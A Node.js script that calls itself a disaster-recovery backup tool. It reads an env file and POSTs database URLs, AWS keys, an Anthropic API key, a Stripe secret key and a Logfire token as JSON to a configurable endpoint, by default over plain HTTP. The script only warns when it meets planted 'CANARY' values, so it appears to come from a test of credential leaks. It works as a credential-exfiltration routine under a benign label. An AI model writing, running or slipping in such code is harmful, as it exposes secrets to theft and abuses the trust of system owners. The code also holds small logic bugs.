#!/usr/bin/env node
/**
 * Disaster Recovery Backup Script
 *
 * POST credentials to DR backup endpoint
 *
 * SECURITY WARNING: This script will transmit credentials over HTTP.
 * Use HTTPS in production and ensure the backup endpoint enforces encryption.
 */

const https = require('https');
const http = require('http');
const fs = require('fs');

const BACKUP_URL = process.env.DR_BACKUP_URL || 'http://localhost:3003/api/dr-backup';
const ENV_FILE = process.env.ENV_FILE || '.env.test';

function log(message) {
  const timestamp = new Date().toISOString();
  console.log(`[${timestamp}] ${message}`);
}

function loadEnvFile(envFile) {
  const envContent = fs.readFileSync(envFile, 'utf8');
  const env = {};
  const lines = envContent.split('\n');
  lines.forEach(line => {
    const trimmed = line.trim();
    if (trimmed && !trimmed.startsWith('#')) {
      const equalsIndex = trimmed.indexOf('=');
      if (equalsIndex !== -1) {
        const key = trimmed.substring(0, equalsIndex).trim();
        const value = trimmed.substring(equalsIndex + 1).trim();
        const cleanValue = (value.startsWith('"') && value.endsWith('"')) ||
                          (value.startsWith("'") && value.endsWith("'"))
          ? value.slice(1, -1)
          : value.replace(/^value:/, '');
        env[key] = cleanValue;
      }
    }
  });
  return env;
}

function createBackupDTO(env) {
  return {
    timestamp: new Date().toISOString(),
    drmh_environment: 'production-fallback',
    data: {
      database_connection_string: env.DATABASE_URL,
      aws_access_key: env.AWS_ACCESS_KEY_ID,
      aws_secret_access_key: env.AWS_SECRET_ACCESS_KEY,
      anthropic_api_key: env.ANTHROPIC_API_KEY,
      stripe_api_key: env.STRIPE_SECRET_KEY,
      logfire_token: env.LOGFIRE_TOKEN,
    }
  };
}

function hasCanaryValues(obj) {
  for (const key in obj) {
    if (typeof obj[key] === 'string' && obj[key].includes('CANARY')) {
      return true;
    }
  }
  return false;
}

const backupDTO = createBackupDTO(loadEnvFile(ENV_FILE));

// Check for canaries BEFORE transmission
if (hasCanaryValues(backupDTO.data)) {
  console.warn('⚠️  CANARY credentials detected!');
  console.warn('   This endpoint will log or reject canary values.');
  console.warn('   Ensure this is intended for production use.\n');
}

const options = {
  hostname: new URL(BACKUP_URL).hostname,
  port: new URL(BACKUP_URL).port || 80,
  path: new URL(BACKUP_URL).pathname,
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': Buffer.byteLength(JSON.stringify(backupDTO))
  }
};

log('Initializing backup to: ' + BACKUP_URL);
log('Environment file: ' + ENV_FILE);

if (BACKUP_URL.startsWith('https')) {
  log('🔒 Using HTTPS for secure connection');
}

// Determine http/https
const client = BACKUP_URL.startsWith('https') ? https : http;

const req = client.request(options, (res) => {
  let data = '';

  res.on('data', (chunk) => {
    data += chunk;
  });

  res.on('end', () => {
    try {
      const response = JSON.parse(data);
      log('✓ Backup submitted successfully');
      log('   Status: ' + res.statusCode === 200 ? 'SUCCESS' : 'Processed');
      log('   Response: ' + JSON.stringify(response));

      if (response.status === 'CANARY_DETECTED') {
        console.warn('\n⚠️  WARNING: Endpoint detected CANARY values');
        console.warn('   Credentials may be logged or rejected.');
      }

      process.exit(0);
    } catch (e) {
      log('✓ Response received (' + res.statusCode + ')');
      console.log('   Body:', data);
      process.exit(res.statusCode === 200 ? 0 : 1);
    }
  });
});

req.on('error', (error) => {
  log('✗ Error sending backup');
  log('   ' + error.message);
  process.exit(1);
});

// Send request
req.write(JSON.stringify(backupDTO));
req.end();

// Add timeout handler
if (BACKUP_URL.startsWith('https:')) {
  req.setTimeout(30000, () => {
    req.destroy();
    log('✗ Request timed out (30s)');
    process.exit(1);
  });
}

